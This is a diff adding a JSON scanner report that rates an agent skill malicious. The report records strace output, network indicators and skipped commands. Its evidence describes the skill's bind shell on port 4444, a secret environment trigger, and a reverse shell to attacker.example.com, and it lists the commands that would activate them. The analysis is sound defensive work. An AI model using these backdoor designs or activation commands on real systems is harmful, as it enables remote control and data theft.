@@ -1,0 +1,298 @@
+{
+  "status": "ok",
+  "outdir": "workshop_malicious_output_final/batch_detect_malicious/Charpup-skill-security-auditor-backdoor-skill",
+  "skill_name": "Charpup-skill-security-auditor-backdoor-skill",
+  "documented_purpose": "Dynamic analysis of installed agent skill based on observed runtime behavior",
+  "verdict": "malicious",
+  "score": 100.0,
+  "score_scale": "0-100",
+  "confidence": "high",
+  "num_patterns": 5,
+  "num_raw_patterns": 5,
+  "num_executed_patterns": 1,
+  "num_intent_only_patterns": 4,
+  "num_executed_malicious_patterns": 0,
+  "num_high_executed_patterns": 0,
+  "num_medium_executed_patterns": 0,
+  "num_strong_intent_patterns": 3,
+  "num_supporting_intent_patterns": 1,
+  "binary_mode": true,
+  "malicious_threshold": 80.0,
+  "suspicious_threshold": 40.0,
+  "aggregation_formula": "min(100, max(S) + 0.1 * sum(S_except_max)); high-risk executed evidence is >=100, strong blocked intent is >=85, weak/supporting-only evidence is capped at 60, and noise-only evidence is capped at 30",
+  "severity_weights": {
+    "low": 40,
+    "medium": 70,
+    "high": 100
+  },
+  "reason": "Dynamic risk score 100.0 exceeded the malicious threshold 80.0.",
+  "network_indicators": {
+    "contacted_domains": [
+      "api.anthropic.com",
+      "http-intake.logs.us5.datadoghq.com"
+    ],
+    "contacted_ips": [
+      "172.17.0.2",
+      "169.254.169.254",
+      "160.79.104.10",
+      "34.149.66.137"
+    ],
+    "contacted_urls": [],
+    "embedded_urls": []
+  },
+  "execution_indicators": {
+    "command_patterns": [
+      "mkdir -p /home/appuser/workdir",
+      "python3 --version",
+      "env presence check for SECRET_TRIGGER (value not printed; found UNSET)",
+      "python3 -m py_compile .../TOOL.py  (compile OK)",
+      "python3 AST static analysis (functions enumerated; no top-level calls)",
+      "timeout 10 python3 .../TOOL.py  (exit 0, inert, no listener)",
+      "ss/netstat grep ':4444' (not listening)",
+      "43    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x6091e78ac110 /* 22 vars */) = 0",
+      "44    execve(\"/usr/bin/cat\", [\"cat\", \"/tmp/user_prompt.txt\"], 0x6091e78b18d0 /* 22 vars */) = 0",
+      "57    execve(\"/usr/bin/git\", [\"/usr/bin/git\", \"config\", \"--get\", \"remote.origin.url\"], 0x4d0d8f74510 /* 28 vars */) = 0",
+      "59    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--version\"], 0x4d0d918c638 /* 24 vars */) = 0",
+      "60    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--no-config\", \"--files\", \"--hidden\", \"--no-ignore\", \"--max-depth\", \"4\", \"--glob\", \".orphaned_at\", \"/home/appuser/.claude/plugins/cache\"], 0x4d0d8f76c10 /* 28 vars */) = 0",
+      "61    execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"ps aux | grep -E \\\"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\\\" | grep -v grep\"], 0x4d0d9b02310 /* 29 vars */) = 0",
+      "62    execve(\"/usr/bin/ps\", [\"ps\", \"aux\"], 0x61ff7ecdac38 /* 29 vars */ <unfinished ...>",
+      "63    execve(\"/usr/bin/grep\", [\"grep\", \"-E\", \"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\"], 0x61ff7ecdad18 /* 29 vars */ <unfinished ...>",
+      "64    execve(\"/usr/bin/grep\", [\"grep\", \"-v\", \"grep\"], 0x61ff7ecdac68 /* 29 vars */ <unfinished ...>",
+      "66    execve(\"/bin/zsh\", [\"/bin/zsh\", \"--version\"], 0x4d0d9b02a10 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "67    execve(\"/usr/bin/zsh\", [\"/usr/bin/zsh\", \"--version\"], 0x4d0d9b02d90 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "68    execve(\"/usr/local/bin/zsh\", [\"/usr/local/bin/zsh\", \"--version\"], 0x4d0d9b03110 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "69    execve(\"/opt/homebrew/bin/zsh\", [\"/opt/homebrew/bin/zsh\", \"--version\"], 0x4d0d9b03110 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "70    execve(\"/bin/bash\", [\"/bin/bash\", \"-c\", \"env\"], 0x4d0d9b02d90 /* 32 vars */) = 0",
+      "70    execve(\"/usr/bin/env\", [\"env\"], 0x57c7d9a1b790 /* 32 vars */) = 0",
+      "72    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x62fc4d88dc00 /* 31 vars */) = 0",
+      "74    execve(\"/usr/bin/cut\", [\"cut\", \"-d \", \"-f3\"], 0x62fc4d895820 /* 31 vars */) = 0",
+      "75    execve(\"/usr/bin/grep\", [\"grep\", \"-vE\", \"^_[^_]\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "78    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "80    execve(\"/usr/bin/grep\", [\"grep\", \"on\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "81    execve(\"/usr/bin/awk\", [\"awk\", \"{print \\\"set -o \\\" $1}\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "82    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "85    execve(\"/usr/bin/sed\", [\"sed\", \"s/^/alias -- /\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "84    execve(\"/usr/bin/sed\", [\"sed\", \"s/^alias //g\"], 0x62fc4d895820 /* 31 vars */) = 0",
+      "86    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "87    execve(\"/usr/bin/cat\", [\"cat\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "88    execve(\"/usr/bin/cat\", [\"cat\"], 0x62fc4d895820 /* 31 vars */ <unfinished ...>",
+      "89    execve(\"/usr/bin/cat\", [\"cat\"], 0x62fc4d895820 /* 31 vars */) = 0",
+      "93    execve(\"/usr/bin/head\", [\"head\", \"-200\"], 0x5dfbccd98ad0 /* 34 vars */) = 0",
+      "92    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"bfs\", \"-S\", \"dfs\", \"-regextype\", \"findutils-default\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill\", \"-type\", \"f\"], 0x5dfbccdaddb0 /* 33 vars */ <unfinished ...>",
+      "99    execve(\"/usr/bin/mkdir\", [\"mkdir\", \"-p\", \"/home/appuser/workdir\"], 0x60999c7d14a0 /* 34 vars */) = 0",
+      "100   execve(\"/usr/local/bin/python3\", [\"python3\", \"--version\"], 0x60999c7d14a0 /* 34 vars */) = 0",
+      "103   execve(\"/usr/local/bin/python3\", [\"python3\", \"-m\", \"py_compile\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill/TOOL.py\"], 0x5762f3eaa100 /* 34 vars */) = 0",
+      "104   execve(\"/usr/local/bin/python3\", [\"python3\", \"-\"], 0x5762f3eaa100 /* 34 vars */ <unfinished ...>",
+      "108   execve(\"/usr/local/bin/python3\", [\"python3\", \"/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill/TOOL.py\"], 0x7fff1e3b2cb0 /* 34 vars */) = 0",
+      "110   execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"ugrep\", \"-G\", \"--ignore-files\", \"--hidden\", \"-I\", \"--exclude-dir=.git\", \"--exclude-dir=.svn\", \"--exclude-dir=.hg\", \"--exclude-dir=.bzr\", \"--exclude-dir=.jj\", \"--exclude-dir=.sl\", \"-E\", \":4444\"], 0x58be092844a0 /* 33 vars */) = 0",
+      "112   execve(\"/usr/bin/netstat\", [\"netstat\", \"-ltnp\"], 0x58be0927f9b0 /* 34 vars */) = 0"
+    ],
+    "execution_parents": [
+      "id",
+      "cat",
+      "git",
+      "claude.exe",
+      "sh",
+      "ps",
+      "grep",
+      "zsh",
+      "bash",
+      "env",
+      "cut",
+      "head",
+      "awk",
+      "sed",
+      "mkdir",
+      "python3",
+      "netstat"
+    ],
+    "tool_call_patterns": [
+      "mkdir -p /home/appuser/workdir",
+      "python3 --version",
+      "env presence check for SECRET_TRIGGER (value not printed; found UNSET)",
+      "python3 -m py_compile .../TOOL.py  (compile OK)",
+      "python3 AST static analysis (functions enumerated; no top-level calls)",
+      "timeout 10 python3 .../TOOL.py  (exit 0, inert, no listener)",
+      "ss/netstat grep ':4444' (not listening)",
+      "{'command': \"python3 -c 'import TOOL; TOOL._hidden_listener()'\", 'reason': 'irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444'}",
+      "{'command': \"SECRET_TRIGGER='open sesame 12345' python3 -c 'import TOOL; TOOL._check_trigger()'\", 'reason': 'activates backdoor / triggers reverse shell'}",
+      "{'command': \"python3 -c 'import TOOL; TOOL._activate_backdoor()'\", 'reason': 'establishes outbound C2 reverse shell to attacker.example.com:4444'}",
+      "{'command': 'network connection to attacker.example.com:4444', 'reason': 'external malicious action / data exfiltration / remote command-and-control'}",
+      "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+    ]
+  },
+  "file_indicators": {
+    "bundled_files": [],
+    "dropped_files": [
+      "{'path': '/home/appuser/.claude/.last-cleanup', 'after': '-rw-r--r--\\t24\\t2026-06-17 07:42:43.6198296190\\t/home/appuser/.claude/.last-cleanup'}",
+      "{'path': '/home/appuser/.claude/backups', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:44:01.1229311040\\t/home/appuser/.claude/backups'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682157808', 'after': '-rw-r--r--\\t33\\t2026-06-17 07:42:37.8089093000\\t/home/appuser/.claude/backups/.claude.json.backup.1781682157808'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781682241122', 'after': '-rw-r--r--\\t24323\\t2026-06-17 07:44:01.1229311040\\t/home/appuser/.claude/backups/.claude.json.backup.1781682241122'}",
+      "{'path': '/home/appuser/.claude/policy-limits.json', 'after': '-rw-------\\t359\\t2026-06-17 07:42:38.4010350820\\t/home/appuser/.claude/policy-limits.json'}",
+      "{'path': '/home/appuser/.claude/projects', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:38.6040147110\\t/home/appuser/.claude/projects'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:43.5499907810\\t/home/appuser/.claude/projects/-home-appuser'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser/72d69057-2779-4e31-a230-9819b97a70c4.jsonl', 'after': '-rw-------\\t65912\\t2026-06-17 07:44:00.8188099470\\t/home/appuser/.claude/projects/-home-appuser/72d69057-2779-4e31-a230-9819b97a70c4.jsonl'}",
+      "{'path': '/home/appuser/.claude/session-env', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:43.6393867390\\t/home/appuser/.claude/session-env'}",
+      "{'path': '/home/appuser/.claude/session-env/72d69057-2779-4e31-a230-9819b97a70c4', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:43.6393867390\\t/home/appuser/.claude/session-env/72d69057-2779-4e31-a230-9819b97a70c4'}",
+      "{'path': '/home/appuser/.claude/sessions', 'after': 'drwx------\\t4096\\t2026-06-17 07:44:00.7985665260\\t/home/appuser/.claude/sessions'}",
+      "{'path': '/home/appuser/.claude/shell-snapshots', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:44:00.8015667270\\t/home/appuser/.claude/shell-snapshots'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill/__pycache__', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:43:21.4939857000\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill/__pycache__'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill/__pycache__/TOOL.cpython-310.pyc', 'after': '-rw-r--r--\\t1761\\t2026-06-17 07:43:21.4938347070\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill/__pycache__/TOOL.cpython-310.pyc'}",
+      "{'path': '/tmp/claude-1000', 'after': 'drwx------\\t4096\\t2026-06-17 07:42:43.6427417700\\t/tmp/claude-1000'}",
+      "{'path': '/tmp/claude-1000/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:43.6431994300\\t/tmp/claude-1000/-home-appuser'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/72d69057-2779-4e31-a230-9819b97a70c4', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:43.6435760580\\t/tmp/claude-1000/-home-appuser/72d69057-2779-4e31-a230-9819b97a70c4'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/72d69057-2779-4e31-a230-9819b97a70c4/tasks', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:43:29.9845308820\\t/tmp/claude-1000/-home-appuser/72d69057-2779-4e31-a230-9819b97a70c4/tasks'}",
+      "{'path': '/tmp/fs_after.txt', 'after': '-rw-r--r--\\t0\\t2026-06-17 07:44:01.8476369510\\t/tmp/fs_after.txt'}",
+      "{'path': '/home/appuser', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:35.9088677800\\t/home/appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:44:01.1305344130\\t/home/appuser'}",
+      "{'path': '/home/appuser/.claude', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:35.9068676460\\t/home/appuser/.claude', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:43.6393867390\\t/home/appuser/.claude'}",
+      "{'path': '/home/appuser/.claude.json', 'before': '-rw-r--r--\\t33\\t2026-06-17 07:42:35.9088677800\\t/home/appuser/.claude.json', 'after': '-rw-r--r--\\t24406\\t2026-06-17 07:44:01.1264578040\\t/home/appuser/.claude.json'}",
+      "{'path': '/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 07:42:35.9144972710\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-backdoor-skill', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 07:43:21.4919278240\\t/home/appuser/.claude/skills/Charpup-skill-security-auditor-backd...",
+      "{'path': '/tmp', 'before': 'drwxrwxrwt\\t4096\\t2026-06-17 07:42:36.9489376010\\t/tmp', 'after': 'drwxrwxrwt\\t4096\\t2026-06-17 07:44:01.8476369510\\t/tmp'}",
+      "{'path': '/tmp/fs_before.txt', 'before': '-rw-r--r--\\t0\\t2026-06-17 07:42:36.9489376010\\t/tmp/fs_before.txt', 'after': '-rw-r--r--\\t1542\\t2026-06-17 07:42:36.9549380040\\t/tmp/fs_before.txt'}"
+    ],
+    "file_patterns": [
+      "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+      "103   openat(AT_FDCWD, \"/usr/local/lib/python3.10/tokenize.py\", O_RDONLY|O_CLOEXEC) = 3",
+      "103   openat(AT_FDCWD, \"/usr/local/lib/python3.10/token.py\", O_RDONLY|O_CLOEXEC) = 3",
+      "/home/appuser/.claude/shell-snapshots"
+    ],
+    "certificate_fingerprints": []
+  },
+  "detected_malicious_patterns": [
+    {
+      "pattern": "command_injection_or_code_execution_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains command-injection, shell-execution, or RCE-style malicious primitive indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "istener()` → `backdoor()` | binds `0.0.0.0:4444`, `accept()`s connections, runs received bytes via `subprocess.run(shell=true)`, returns stdout | **bind shell / rce** | | `_check_trigger()` | reads env `secret_trigger`; if it equals `\"open sesame 12345\"`, calls `_a",
+          "\" } ``` **overall verdict: malicious.** evidence: a bind shell (`socket.bind((\"0.0.0.0\",4444))` + `subprocess.run(shell=true)` on received bytes), an environment-variable secret trigger (`secret_trigger == \"open sesame 12345\"`), and a hardcoded reverse shell to `a",
+          "tool; tool._hidden_listener()'\", \"reason\": \"irreversible action / opens unauthenticated bind-shell rce on 0.0.0.0:4444\" }, { \"command\": \"secret_trigger='open sesame 12345' python3 -c 'import tool; tool._check_trigger()'\", \"reason\": \"activates backdoor / triggers reverse sh"
+        ],
+        "commands_skipped": [
+          "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444",
+          "SECRET_TRIGGER='open sesame 12345' python3 -c 'import TOOL; TOOL._check_trigger()' | reason: activates backdoor / triggers reverse shell",
+          "python3 -c 'import TOOL; TOOL._activate_backdoor()' | reason: establishes outbound C2 reverse shell to attacker.example.com:4444",
+          "network connection to attacker.example.com:4444 | reason: external malicious action / data exfiltration / remote command-and-control"
+        ],
+        "skipped_unsafe_commands": [
+          "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+        ]
+      },
+      "evidence_short": "primitive=istener()` → `backdoor()` | binds `0.0.0.0:4444`, `accept()`s connections, runs received bytes via `subprocess.run(shell=true)`, returns stdout | **bind shell / rce** | | `_chec...; command=python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+    },
+    {
+      "pattern": "backdoor_or_malicious_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains backdoor, reverse-shell, bind-shell, or hidden malicious behavior indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "r='open sesame 12345' python3 -c 'import tool; tool._check_trigger()' python3 -c 'import tool; tool._activate_backdoor()' network connection to attacker.example.com:4444 python3 -c 'import tool; tool._hidden_listener()' irreversible python3 -c 'import tool;",
+          "ort tool; tool._hidden_listener()' secret_trigger='open sesame 12345' python3 -c 'import tool; tool._check_trigger()' python3 -c 'import tool; tool._activate_backdoor()' network connection to attacker.example.com:4444 python3 -c 'import tool; tool._hidde",
+          "python3 -c 'import tool; tool._hidden_listener()' secret_trigger='open sesame 12345' python3 -c 'import tool; tool._check_trigger()' python3 -c 'import tool; tool._activate_backdoor()' network connection",
+          "l; tool._check_trigger()' python3 -c 'import tool; tool._activate_backdoor()' network connection to attacker.example.com:4444 python3 -c 'import tool; tool._hidden_listener()' irreversible python3 -c 'import tool; tool._hidden_listener()'",
+          "with its name). the skill metadata is innocuous (\"test skill for security scanning\"), but `tool.py` contains three dormant attack functions: | function | behavior | verdict | |---|---|---| | `_hidden_listener()` → `backdoor()` | binds `0.0.0.0:4444`, `accept()`s connections, runs received bytes via `subprocess.run(shell=true)`, returns stdout | **bind shell / r",
+          "xecutor] prompt loaded successfully from /app/logs/malicious_awesome/charpup-skill-security-auditor-backdoor-skill/.prompt_input.txt all safe local execution is complete. the module ran inert (exit 0) and opened no listener. i will **not** exercise any of the three backdoor functions — those are the explicitly malicious paths. ## analysis this skill is **mali",
+          "ormant attack functions: | function | behavior | verdict | |---|---|---| | `_hidden_listener()` → `backdoor()` | binds `0.0.0.0:4444`, `accept()`s connections, runs received bytes via `subprocess.run(shell=true)`, returns stdout | **bind shell / rce** | | `_check_trigger()` | reads env `secret_trigger`; if it equals `\"open sesame 12345\"`, calls `_activate_backdoor()` | **hidden trigger*"
+        ],
+        "commands_skipped": [
+          "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444",
+          "SECRET_TRIGGER='open sesame 12345' python3 -c 'import TOOL; TOOL._check_trigger()' | reason: activates backdoor / triggers reverse shell",
+          "python3 -c 'import TOOL; TOOL._activate_backdoor()' | reason: establishes outbound C2 reverse shell to attacker.example.com:4444",
+          "network connection to attacker.example.com:4444 | reason: external malicious action / data exfiltration / remote command-and-control"
+        ],
+        "skipped_unsafe_commands": [
+          "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+        ]
+      },
+      "evidence_short": "primitive=r='open sesame 12345' python3 -c 'import tool; tool._check_trigger()' python3 -c 'import tool; tool._activate_backdoor()' network connection to attacker.example.com:4444 python3...; command=python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+    },
+    {
+      "pattern": "credential_exfiltration_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains credential theft or data exfiltration intent indicators.",
+      "evidence": {
+        "source": "claude_output.txt",
+        "primitive_evidence": [
+          "secret/environment harvesting with outbound transmission context"
+        ],
+        "commands_skipped": [
+          "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444",
+          "SECRET_TRIGGER='open sesame 12345' python3 -c 'import TOOL; TOOL._check_trigger()' | reason: activates backdoor / triggers reverse shell",
+          "python3 -c 'import TOOL; TOOL._activate_backdoor()' | reason: establishes outbound C2 reverse shell to attacker.example.com:4444",
+          "network connection to attacker.example.com:4444 | reason: external malicious action / data exfiltration / remote command-and-control"
+        ]
+      },
+      "evidence_short": "primitive=secret/environment harvesting with outbound transmission context; command=python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+    },
+    {
+      "pattern": "unsafe_command_skipped",
+      "severity": "medium",
+      "base_weight": 70,
+      "effective_score": 35.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "medium",
+      "summary": "Unsafe command was identified and skipped during safe sandbox execution.",
+      "evidence": {
+        "skipped_unsafe_commands": [
+          "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+        ],
+        "unsafe_command_instructions": [
+          "irreversible",
+          "python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+        ]
+      },
+      "evidence_short": "skipped=python3 -c 'import TOOL; TOOL._hidden_listener()' | reason: irreversible action / opens unauthenticated bind-shell RCE on 0.0.0.0:4444"
+    },
+    {
+      "pattern": "reconnaissance_or_enumeration",
+      "severity": "low",
+      "base_weight": 40,
+      "effective_score": 30.0,
+      "evidence_type": "executed",
+      "artifacts": [
+        "strace.log"
+      ],
+      "executed": true,
+      "pattern_confidence": "low",
+      "summary": "Meaningful system or process enumeration activity was detected.",
+      "evidence": {
+        "strong_reconnaissance": [
+          "112   execve(\"/usr/bin/netstat\", [\"netstat\", \"-ltnp\"], 0x58be0927f9b0 /* 34 vars */) = 0"
+        ],
+        "process_enumeration": [
+          "112   execve(\"/usr/bin/netstat\", [\"netstat\", \"-ltnp\"], 0x58be0927f9b0 /* 34 vars */) = 0"
+        ]
+      },
+      "evidence_short": "strong=112   execve(\"/usr/bin/netstat\", [\"netstat\", \"-ltnp\"], 0x58be0927f9b0 /* 34 vars */) = 0"
+    }
+  ]
+}
